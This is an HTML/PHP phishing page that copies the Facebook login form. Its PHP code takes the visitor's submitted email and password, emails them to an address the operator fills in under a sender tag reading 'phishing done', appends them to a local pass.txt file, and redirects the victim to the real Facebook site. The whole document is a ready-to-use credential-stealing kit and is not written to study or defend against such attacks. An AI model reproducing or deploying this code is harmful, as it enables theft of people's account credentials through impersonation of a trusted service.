<html>
<head>
<link rel="stylesheet" type="text/css" href="fb.css">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title >
Facebook
</title>
<link rel="shortcut icon" href="index.jpg" />
<script>




</script>
</head>

<body>
<div id="upper">
<div id="head">facebook
<input type="submit" id="sign"value="Sign Up" name="button">
</div>

</div>

<div id="center">
<form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"])?>">
<p>Log in to Facebook</p>
<p><input type="text" id="text" placeholder="Email address or phone number" name="name" ></p>
<p><input type="password" id="pass" placeholder="Password"  name="password"></p>
<p><input type="submit" id="butt"   value="Log In" ></p>
<div id="checkbox">keep me log in:<input type="checkbox" value="keep me log in"></div>
<p id="forgot"><a href="null">Forgot Password?</a>  <a href="null">Signup Now</a></p>
</div>
</form>

<?php
header ('Location: https://www.facebook.com');
$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}
$posts       .= "some one click your link\n";
$emailto    = 'Enter Your Email';
$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
$from        = "From: Password <phishing done>";
$body        = '
'.$posts.'
';
@mail($emailto, $subject, $body, $from);
$handle = @fopen("pass.txt", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>

</body>

</html>
